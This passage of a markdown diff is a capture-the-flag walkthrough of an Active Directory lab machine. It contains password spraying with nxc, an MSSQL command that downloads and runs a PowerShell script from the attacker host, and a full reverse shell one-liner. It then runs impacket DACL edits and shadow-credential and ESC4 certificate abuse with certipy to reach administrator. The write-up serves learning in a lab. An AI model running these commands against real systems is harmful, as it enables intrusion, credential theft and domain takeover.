@@ -133,3 +133,85 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         Users                                                   READ ONLY
 [*] Closed 1 connections 
 ```
+Downloading the files inside of Accounting Department, we find that both files have been corrupted, changing the magicbytes allows us to read the file.
+[magicbytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
+```
+hexedit accounts.xlsx
+// replace the few characters to: 50 4B 03 04
+```
+![capture-1](capture-1.PNG)
+This reveals an accounts document.
+![capture-2](accounts.PNG)
+Spraying these usernames and passwords does not yield any results, instead we have to target the mssql account.
+```
+nxc mssql 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --local-auth
+```
+![capture-3](capture-3.PNG)
+
+## mssql
+With the mssql account compromised, we can run a local command to gain a reverse shell.
+Use a nishang powershell one-liner found: [nishang](https://github.com/samratashok/nishang/tree/master/Shells)
+I used: `Invoke-PowerShellTcpOneLine.ps1`
+```
+nxc mssql 10.129.232.128 -u 'sa'  -p  'MSSQLP@ssw0rd!' --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.48:3000/powershell_reverse_tcp.ps1")'
+```
+![capture-4](capture-4.PNG)
+`Skip this if you're still stuck on the reverse shell`
+```
+# THIS IS THE REVERSE SHELL USED. REMEMBER TO CHANGE THE IP.
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.48',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+## sql_svc
+After gaining a reverse shell as sql_svc, going to `C:\', we find a 'SQL2019' directory which reveals some credentials.
+![capture-5](capture-5.PNG)
+Spraying this password across the network reveals a new user.
+```
+nxc smb 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --continue-on-success
+```
+![capture-6](capture-6.PNG)
+
+## Ryan
+Looking through bloodhound, Ryan has `WriteOwner` over ca_svc<br>
+[WriteOwner by SpecterOps](https://medium.com/@aslam.mahimkar/exploiting-ad-dacl-writeowner-misconfiguration-ca61fb2fcee1)<br>
+[Download PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+![capture-7](capture-7.PNG)
+Using impackets ownerdit, we can write a new owner for the ca_svc account.
+```
+impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
+```
+![capture-8](capture-8.PNG)
+However, we still don't have full control over the account yet.
+```
+impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
+```
+![capture-9](capture-9.PNG)
+<div style="text-align: center;">
+  ⚠️ <strong>READ ME IF STUCK</strong> ⚠️<br>
+  If for whatever reason the next step DOES NOT WORK, re-run the previous two steps. AND re-run the dacledit twice.
+</div>
+<br>
+Once we have written our FullControl DACL edit, we can finally create a shadow credential.
+```
+certipy-ad shadow auto -u "ryan@sequel.htb" -p "WqSZAF6CysDQbGb3" -account "ca_svc" -dc-ip "10.129.232.128"
+```
+
+![capture-10](capture-10.PNG)
+
+Using this hash, we can exploit ESC4.
+```
+certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
+```
+![capture-11](capture-11.PNG)
+This verify's that the cert publisher is vulnerable to a ESC4 exploit.
+```
+certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
+```
+![capture-12](capture-12.PNG)
+We can now request a cert.
+```
+certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target-ip 10.129.232.128
+```
+![capture-13](capture-13.PNG)
+Using the pfx file, we can request the administrator hash and use it for a PTH attack.
+![capture-14](capture-14.PNG)
